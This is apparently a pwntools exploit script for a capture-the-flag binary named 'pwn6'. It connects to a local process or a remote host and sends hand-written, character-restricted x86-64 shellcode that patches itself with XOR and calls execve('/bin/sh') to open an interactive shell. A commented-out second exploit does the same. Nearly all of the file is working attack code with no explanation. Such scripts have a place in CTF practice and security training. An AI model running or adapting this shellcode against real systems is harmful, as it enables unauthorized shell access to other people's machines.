#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn6'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

payload = asm('''
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    push rsp
    pop rdi

    push 0x58585d57
    pop rax
    xor [rdx+38],rax

    push 0x58
    pop rax
    xor [rdx+63],rax
    xor al, 0x58
    push rax
    push rax
    pop rdx
    pop rsi
    push 0x3b
    pop rax

''').ljust(64-8,'X')

payload += '/bin/shX'

# print payload
debug('b *0x004007f8')
sl(payload)

p.interactive()


# binLep exp
# pd = asm('''
# push 0x70
# pop rdx
# push rdi
# push rdi
# push rdi
# sub byte ptr [rsi + 0x22], dl
# sub byte ptr [rsi + 0x2a], dl
# sub byte ptr [rsi + 0x2e], dl
# sub byte ptr [rsi + 0x2f], dl
# sub byte ptr [rsi + 0x45], dl
# sub byte ptr [rsi + 0x45], dl
# sub byte ptr [rsi + 0x45], dl
# pop rsi
# pop rsi
# pop rdx
# push 0x3b
# pop rax
# ''')
# pd += "\x48\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x70"
# pd += asm("""
# push rdi
# push rsp
# pop rdi
# """)
# pd += "\x7f\x75"
# se(pd)
